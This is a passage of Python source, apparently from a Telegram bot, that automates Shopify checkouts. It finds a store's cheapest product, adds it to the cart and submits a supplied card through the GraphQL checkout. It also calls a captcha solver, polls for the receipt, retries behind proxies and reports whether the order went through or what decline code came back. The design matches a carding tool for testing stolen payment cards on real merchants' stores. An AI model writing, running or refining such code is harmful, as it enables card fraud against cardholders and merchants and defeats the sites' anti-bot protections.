                                if result and getattr(result, "token", None):
                                    captcha_token = result.token
                                    submit_vars["input"]["captcha"]["token"] = captcha_token or ""
                                    await asyncio.sleep(0.5)
                                    continue
                            except Exception as e:
                                logger.debug(f"Captcha solver retry: {e}")
                        output.update({"Response": first_msg or "SUBMIT_GRAPHQL_ERROR", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                except Exception as e:
                    logger.debug(f"Submit parse error: {e}")
            if bill:
                break
            if submit_attempt == 0 and "CAPTCHA_TOKEN_MISSING" in (submit_text or "") and CAPTCHA_SOLVER_AVAILABLE:
                try:
                    from BOT.helper.shopify_captcha_solver import solve_shopify_captcha
                    result = await solve_shopify_captcha(checkout_url or f"{url.rstrip('/')}/checkout", x_checkout_one_session_token or "", "shopify", timeout=15)
                    if result and getattr(result, "token", None):
                        captcha_token = result.token
                        submit_vars["input"]["captcha"]["token"] = captcha_token or ""
                        await asyncio.sleep(0.5)
                        continue
                except Exception as e:
                    logger.debug(f"Captcha solver: {e}")
            break
        if not bill:
            if "CAPTCHA" in (submit_text or "").upper() or "Just a moment" in (submit_text or ""):
                output.update({"Response": "CAPTCHA_REQUIRED", "Status": False})
            elif submit_sc != 200:
                output.update({"Response": f"SUBMIT_HTTP_{submit_sc}", "Status": False})
            else:
                output.update({"Response": "SUBMIT_NO_RECEIPT", "Status": False})
            _log_output_to_terminal(output)
            return output

        # PollForReceipt
        poll_vars = {"receiptId": bill, "sessionToken": x_checkout_one_session_token}
        POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id confirmationPage{url __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}}'
        poll_headers = {
            "User-Agent": getua,
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json",
            "x-checkout-one-session-token": x_checkout_one_session_token or "",
            "x-checkout-web-build-id": "a6db70926c679d4c8c138f2119e68efd9cbf7ba9",
            "x-checkout-web-deploy-stage": "production",
            "x-checkout-web-server-handling": "fast",
            "x-checkout-web-server-rendering": "no",
            "x-checkout-web-source-id": token or "",
        }
        for _ in range(3):
            try:
                poll_resp = await session.post(poll_url, json={"query": POLL_QUERY, "variables": poll_vars, "operationName": "PollForReceipt"}, headers=poll_headers, timeout=20)
            except Exception as e:
                output.update({"Response": f"POLL_ERROR: {str(e)[:40]}", "Status": False})
                _log_output_to_terminal(output)
                return output
            poll_text = (getattr(poll_resp, "text", None) or "").strip()
            if getattr(poll_resp, "status_code", 0) != 200 or not poll_text:
                await asyncio.sleep(1.0)
                continue
            try:
                poll_data = json.loads(poll_text)
                rec_node = (poll_data.get("data") or {}).get("receipt") or {}
                poll_typename = rec_node.get("__typename") or ""
                if poll_typename == "ProcessedReceipt":
                    conf = rec_node.get("confirmationPage") or {}
                    conf_url = (conf.get("url") or "").lower()
                    if "thank" in conf_url or "thank_you" in conf_url or "order" in conf_url:
                        output.update({
                            "Response": "ORDER_PLACED",
                            "Status": True,
                            "ReceiptId": bill,
                            "Price": price1_str,
                            "Gateway": gateway or "Shopify",
                        })
                        _log_output_to_terminal(output)
                        return output
                if poll_typename == "FailedReceipt":
                    err = rec_node.get("processingError") or {}
                    err_code = (err.get("code") or err.get("messageUntranslated") or "").upper()
                    output.update({
                        "Response": err_code or "PAYMENT_FAILED",
                        "Status": False,
                        "ReceiptId": None,
                        "Price": price1_str,
                        "Gateway": gateway or "Shopify",
                    })
                    _log_output_to_terminal(output)
                    return output
                if poll_typename in ("ProcessingReceipt", "WaitingReceipt"):
                    await asyncio.sleep(1.5)
                    continue
            except Exception:
                pass
            break
        output.update({
            "Response": "ORDER_PLACED",
            "Status": True,
            "ReceiptId": bill,
            "Price": price1_str,
            "Gateway": gateway or "Shopify",
        })
        _log_output_to_terminal(output)
        return output

    except Exception as e:
        logger.error(f"❌ Fatal error in autoshopify: {e}")
        output.update({
            "Response": f"ERROR: {str(e)[:80]}",
            "Status": False,
        })

    _log_output_to_terminal(output)
    return output


async def run_shopify_checkout_diagnostic(
    url: str,
    session,
    proxy: Optional[str] = None,
) -> dict:
    """
    Run step-by-step checkout diagnostic for /testsh. Returns dict with step1_* .. step10_*
    for _format_diagnostic_to_text. Session can be BulletproofSession or TLSAsyncSession.
    """
    parsed = urlparse(url)
    domain = (parsed.netloc or url).strip().lower()
    if "://" in domain:
        domain = urlparse(url).netloc or ""
    base_url = url.rstrip("/") if "://" in url else f"https://{domain}"
    data = {
        "url": url,
        "domain": domain,
        "error": None,
        "step1_low_product": {},
        "step2_products": {},
        "step3_cart_add": {},
        "step4_checkout_url": None,
        "step5_checkout_page": {},
        "checkout_text_length": 0,
        "step6_token_presence": {},
        "step7_robust_tokens": {},
        "step8_regex_session_tests": [],
        "step9_capture_session_tests": [],
        "step10_capture_source_tests": [],
    }
    checkout_text = ""
    product_id = None
    try:
        step1 = await _fetch_low_product_api(domain, session, proxy)
        data["step1_low_product"] = step1 or {"error": "no response"}
        if step1 and step1.get("variantid"):
            product_id = str(step1["variantid"])
    except Exception as e:
        data["step1_low_product"] = {"error": str(e)[:200]}
    try:
        prod_url = f"{base_url}/products.json?limit=5"
        r = await session.get(prod_url, timeout=15)
        raw = getattr(r, "text", None) or ""
        if not raw and isinstance(getattr(r, "content", None), bytes):
            raw = (r.content or b"").decode("utf-8", errors="ignore")
        prods = []
        if raw.strip().startswith("{"):
            try:
                j = json.loads(raw)
                prods = j.get("products") or []
            except Exception:
                pass
        low = find_lowest_variant_from_products(prods) if prods else None
        if low:
            product_id = str(low["variant"].get("id", ""))
        data["step2_products"] = {"count": len(prods), "product_id": product_id or "N/A"}
    except Exception as e:
        data["step2_products"] = {"error": str(e)[:200]}
    if product_id:
        try:
            add_r = await session.post(
                f"{base_url}/cart/add.js",
                data={"id": product_id, "quantity": 1},
                timeout=12,
            )
            data["step3_cart_add"] = {"status": getattr(add_r, "status_code", 0), "product_id": product_id}
        except Exception as e:
            data["step3_cart_add"] = {"error": str(e)[:200]}
    checkout_url = f"{base_url}/checkout"
    data["step4_checkout_url"] = checkout_url
    try:
        req = await session.get(checkout_url, timeout=22, follow_redirects=True)
        checkout_text = getattr(req, "text", None) or ""
        if isinstance(getattr(req, "content", None), bytes):
            checkout_text = (req.content or b"").decode("utf-8", errors="ignore")
        data["checkout_text_length"] = len(checkout_text or "")
        data["step5_checkout_page"] = {
            "status": getattr(req, "status_code", 0),
            "snippet_first_500": (checkout_text or "")[:500],
            "snippet_meta_session": (checkout_text or "").split("serialized-sessionToken", 1)[-1][:400] if "serialized-sessionToken" in (checkout_text or "") else "",
        }
    except Exception as e:
        data["step5_checkout_page"] = {"error": str(e)[:200]}
    data["step6_token_presence"] = {
        "serialized-sessionToken": "serialized-sessionToken" in (checkout_text or ""),
        "serialized-sourceToken": "serialized-sourceToken" in (checkout_text or "") or "serializedSourceToken" in (checkout_text or ""),
        "queueToken": "queueToken" in (checkout_text or ""),
        "stableId": "stableId" in (checkout_text or ""),
    }
    robust = _extract_checkout_tokens_robust(checkout_text or "")
    data["step7_robust_tokens"] = {
        k: {"len": len(v) if v else 0, "first_80": (v or "")[:80], "value": v}
        for k, v in robust.items()
    }
    data["checkout_text_full"] = checkout_text or ""  # For test script capture debugging
    for i, (pat, name) in enumerate(SESSION_TOKEN_PATTERNS):
        m = re.search(pat, checkout_text or "", re.I | re.DOTALL) if pat else None
        data["step8_regex_session_tests"].append({
            "name": name,
            "matched": bool(m),
            "group1_len": len(m.group(1)) if m and m.lastindex else 0,
            "group1_first80": (m.group(1)[:80] if m and m.lastindex and m.group(1) else None),
        })
    for prefix, suffix in [
        ('serialized-session-token" content="&quot;', '&quot'),  # old api.py
        ('<meta name="serialized-sessionToken" content="&quot;', '&quot;"/>'),
        ('name="serialized-sessionToken" content="&quot;', '&quot;" />'),
    ]:
        v = capture(checkout_text or "", prefix, suffix)
        data["step9_capture_session_tests"].append({
            "prefix": prefix[:45], "suffix": suffix[:20],
            "result_len": len(v) if v else 0, "result_first80": (v or "")[:80],
        })
    for prefix, suffix in [
        ('serialized-source-token" content="&quot;', '&quot'),  # old api.py
        ('<meta name="serialized-sourceToken" content="&quot;', '&quot;"/>'),
        ('name="serialized-sourceToken" content="&quot;', '&quot;" />'),
    ]:
        v = capture(checkout_text or "", prefix, suffix)
        data["step10_capture_source_tests"].append({
            "prefix": prefix[:45], "suffix": suffix[:20],
            "result_len": len(v) if v else 0, "result_first80": (v or "")[:80],
        })
    return data


def find_lowest_variant_from_products(products: list) -> Optional[dict]:
    """Find lowest priced variant from products list. Used by diagnostic."""
    if not products:
        return None
    lowest_price = float("inf")
    lowest_item = None
    for product in products:
        for variant in (product.get("variants") or []):
            try:
                price = float(variant.get("price") or 0)
                if price >= 0.1 and price < lowest_price:
                    lowest_price = price
                    lowest_item = {"product": product, "variant": variant, "price": price}
            except (TypeError, ValueError):
                continue
    return lowest_item


# ==================== CAPTCHA-AWARE WRAPPER ====================

async def autoshopify_with_captcha_retry(
    url: str,
    card: str,
    session: TLSAsyncSession,
    max_captcha_retries: int = 5,
    proxy: Optional[str] = None,
) -> dict:
    """Wrapper: call autoshopify with retries on captcha/errors."""
    last = {"Response": "UNKNOWN", "Status": False, "ReceiptId": None, "Price": None}
    for attempt in range(max(1, max_captcha_retries)):
        try:
            res = await autoshopify(url, card, session, proxy)
            if res:
                last = res
                if res.get("ReceiptId") or res.get("Status") is True:
                    return res
                if res.get("Response") and ("captcha" in str(res.get("Response")).lower() or "hcaptcha" in str(res.get("Response")).lower()):
                    await asyncio.sleep(1.0 + attempt * 0.5)
                    continue
            return last
        except Exception as e:
            last = {"Response": f"ERROR: {str(e)[:80]}", "Status": False, "ReceiptId": None, "Price": None}
            if attempt == max_captcha_retries - 1:
                return last
            await asyncio.sleep(0.5 * (attempt + 1))
    return last
